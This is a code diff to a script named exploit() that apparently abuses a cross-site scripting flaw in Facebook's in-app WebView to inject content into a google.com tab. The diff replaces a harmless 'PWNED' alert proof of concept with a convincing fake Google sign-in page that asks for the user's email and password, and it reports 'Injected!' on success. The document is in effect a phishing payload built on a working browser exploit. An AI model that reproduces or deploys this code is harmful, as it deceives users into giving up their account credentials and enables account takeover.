@@ -6,6 +6,7 @@
 
 <script>
 function exploit() {
+  // Buka google.com dulu
   const tab = window.open(
     "https://www.google.com/csi", "_blank"
   );
@@ -22,13 +23,37 @@ function exploit() {
         (function() {
           if(window.__fbUxss) return;
           window.__fbUxss = 1;
-          document.body?.insertAdjacentHTML(
-            'afterbegin',
-            '<h1 style="color:red">PWNED FB WebView</h1>'
-          );
-          alert(document.domain);
+
+          // Inject konten
+          document.body.innerHTML = \`
+            <div style="
+              font-family:Arial;
+              text-align:center;
+              padding:40px;
+            ">
+              <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
+              <h1>Sign in</h1>
+              <p>Use your Google Account</p>
+              <input type="email" placeholder="Email or phone"
+                style="display:block;width:300px;padding:12px;
+                       margin:10px auto;border:1px solid #ccc;
+                       border-radius:4px;font-size:16px;">
+              <input type="password" placeholder="Password"
+                style="display:block;width:300px;padding:12px;
+                       margin:10px auto;border:1px solid #ccc;
+                       border-radius:4px;font-size:16px;">
+              <button style="background:#1a73e8;color:white;
+                             border:none;padding:12px 32px;
+                             border-radius:4px;font-size:16px;
+                             cursor:pointer;">
+                Next
+              </button>
+            </div>
+          \`;
         })();
       `);
+      document.getElementById('status').textContent = 
+        'Injected! Check new tab!';
     } catch(e) {
       document.getElementById('status').textContent = 
         'Failed: ' + e.message;
